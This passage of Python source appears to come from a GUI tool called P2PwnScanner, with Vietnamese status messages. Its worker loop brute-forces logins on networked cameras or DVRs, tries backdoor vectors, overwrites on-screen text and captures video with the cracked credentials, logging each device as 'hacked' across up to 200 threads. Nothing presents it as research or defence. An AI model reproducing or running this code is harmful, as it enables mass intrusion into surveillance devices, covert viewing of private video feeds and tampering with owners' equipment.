                    if cfg["brute"]:
                        creds, proto = BruteForce.run(
                            ip, timeout=5, max_attempts=80)
                        if creds:
                            hacked = True
                            notes["creds"] = creds
                            if ":" in creds:
                                user, pw = creds.split(":", 1)
                            self.log(log_msg(
                                f"🔑 {serial} ({ip}) -> {creds} [{proto}]",
                                "+"))

                    if cfg["backdoor"]:
                        vecs = Backdoor.run_all(ip, timeout=5)
                        if vecs:
                            hacked = True
                            notes["backdoor"] = ",".join(vecs)
                            self.log(log_msg(
                                f"🚪 {serial} ({ip}) backdoor: "
                                f"{notes['backdoor']}", "+"))

                    do_osd = cfg["osd"] or (cfg["osd_pro"] and hacked)
                    if do_osd:
                        ok, vec = OSD.run(ip, user=user, password=pw,
                                          text=OSD_TEXT, timeout=5)
                        if ok and vec:
                            notes["osd"] = vec
                            self.log(log_msg(
                                f"🎯 {serial} ({ip}) OSD via "
                                f"{notes['osd']}", "+"))

                    if cfg["video"]:
                        ok, fn, nf = VideoCapture.video_mjpeg(
                            ip, user=user, password=pw, channel=1,
                            duration=5, timeout=8, outdir=outdir)
                        if ok and fn:
                            notes["video"] = fn
                            self.log(log_msg(
                                f"🎥 {serial} ({ip}) video: "
                                f"{nf} frames", "+"))

                    self.db.add(
                        serial=serial, ip=ip,
                        status="hacked" if hacked else "online",
                        creds=notes["creds"], cve=notes["cve"],
                        backdoor=notes["backdoor"], osd=notes["osd"],
                        video=notes["video"])

                    if hacked:
                        with self.lock:
                            self.stats["hacked"] += 1
                        self.ui_update("hack", serial, ip)
                    else:
                        with self.lock:
                            self.stats["skip"] += 1

                except Exception as e:
                    self.log(log_msg(f"Error {serial}: {e}", "-"))
                    with self.lock:
                        self.stats["skip"] += 1
                finally:
                    q.task_done()

        n = max(1, min(threads, 200))
        workers = []
        for _ in range(n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            workers.append(t)

        prod_t.join()
        q.join()
        self.stop_event.set()

        elapsed = time.time() - (self.start_time or time.time())
        self.log(log_msg(f"=== HOAN TAT trong {elapsed:.1f}s ==="))
        with self.lock:
            h = self.stats["hacked"]
            o = self.stats["online"]
            s = self.stats["skip"]
        self.log(log_msg(f"Hack={h} Online={o} Skip={s}"))
        self.root.after(
            0, lambda: self.l_status.config(
                text=f"Hoàn tất trong {elapsed:.1f}s"))


# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    root = tk.Tk()
    app = P2PwnScanner(root)
    root.mainloop()
